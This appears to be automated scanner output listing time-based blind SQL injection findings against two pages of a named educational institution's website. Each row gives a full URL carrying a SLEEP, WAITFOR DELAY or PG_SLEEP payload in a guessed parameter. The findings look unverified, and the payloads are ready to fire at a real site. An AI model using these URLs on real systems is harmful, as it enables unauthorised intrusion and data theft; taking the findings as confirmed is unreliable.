Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/tbi/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/tbi/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/tbi/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/tbi/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/tbi/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/tbi/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/tbi/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
